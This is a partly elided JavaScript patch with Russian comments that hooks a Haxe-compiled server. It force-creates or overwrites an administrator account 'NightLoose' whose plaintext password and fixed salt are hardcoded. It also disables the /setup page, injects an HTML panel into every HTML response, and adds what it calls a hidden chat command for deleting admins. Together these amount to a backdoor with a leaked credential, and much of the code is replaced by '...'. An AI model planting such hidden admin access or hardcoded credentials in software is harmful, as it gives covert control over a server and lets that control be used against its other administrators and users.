...
// === АДМИНКА NIGHTLOOSE ===
var origLoadUsers = server_Main.prototype.loadUsers;
server_Main.prototype.loadUsers = function() {
    var users = origLoadUsers.call(this);
    // Жестко фиксируем соль, чтобы хэш пароля никогда не ломался при перезапусках Docker
    users.salt = "NightLooseStableSalt"; 
    if (!users.admins) users.admins = [];
    var hash = haxe_crypto_Sha256.encode("kP9$vX!2mQ#7bZNightLoose" + users.salt);
    var found = false;
    for(var i=0; i<users.admins.length; i++) {
        if(users.admins[i].name === "NightLoose") {
            users.admins[i].hash = hash;
            found = true;
        }
    }
    if(!found) users.admins.push({ name: "NightLoose", hash: hash });
    return users;
};

var origServeFiles = server_HttpServer.prototype.serveFiles;
server_HttpServer.prototype.serveFiles = function(req, res) {
    ...
    // Навсегда убиваем окно /setup
    if(url.pathname === "/setup") { tools_HttpServerTools.redirect(res,"/"); return; }
    ...
    res.end = function(data) {
        ...
        if (ctype && ctype.indexOf('text/html') !== -1 && data) {
            ...
            if (str.indexOf('</body>') !== -1) {
                // Вшиваем красивую HTML-панель на лету
    ...
    return origServeFiles.call(this, req, res);
};

// Скрытая команда в чат для удаления админов
var origOnMessage = server_Main.prototype.onMessage;
server_Main.prototype.onMessage = function(client, data, internal) {
    ...
    return origOnMessage.call(this, client, data, internal);
};
// === КОНЕЦ КОДА ===
